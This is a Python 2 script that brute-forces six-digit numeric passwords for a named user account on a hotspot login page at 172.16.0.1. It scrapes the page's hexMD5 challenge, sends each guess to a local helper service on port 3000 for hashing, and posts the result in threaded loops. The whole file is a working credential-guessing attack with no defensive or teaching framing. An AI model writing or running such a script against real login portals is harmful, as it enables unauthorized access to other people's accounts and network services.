#!/usr/bin/env python
# coding=utf-8
import urllib
import urllib2
import httplib
import re
import json
import cookielib
import threading

url = "http://172.16.0.1/login"
token_url = "http://127.0.0.1:3000?a=1"
regex = re.compile(r'hexMD5\((.*?)\)')
username_ = 'zd812021'

def run(start,end):
    for num in range(start,end):
        password_ = '{:0>6}'.format(num)
        try:
            conn = httplib.HTTPConnection("172.16.0.1")
            conn.request(method="GET",url=url)
            response = conn.getresponse()
            res = response.read()
            token = re.search(regex,res).group(1)
            #print token
            array = token.split('+',2);
            high = array[0].replace('\\','+').replace(' ','');
            low = array[2].replace('\\','+').replace(' ','');
            token_conn = httplib.HTTPConnection("127.0.0.1:3000")
            params = {'high':high,'mid':password_,'low':low}
            headers = {'content-type': 'application/json;charset=utf-8', 'Accept':'text/plain'}
            token_conn.request("POST",token_url,json.dumps(params),headers)
            response = token_conn.getresponse()
            tt = response.read()
            body = "username={0}&password={1}&dst=&popup=true".format(username_,tt)
            head_data = {"Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8","Referer":"http://172.16.0.1/login","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,ima    ge/apng,*/*;q=0.8","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/    537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36","Content-Type":"application/x-www-form-urlencoded","Upgrade-Insecure-Requests":"1","Origin":"http://172.16.0.1","Cache-Control":"max-age=0","Host":"172.16.0.1","loginID":"53945472"}
            conn.request(method="POST",url=url,body=body,headers = head_data) 
            conn.getresponse().read()
            print username_
        except Exception as err:
            print err
            print username_
            print password_
            break




if __name__ == '__main__':
    for i in range(6,7):
        t = threading.Thread(target=run,args=(i*100000,(i+1)*100000,))
        t.start()
        print i
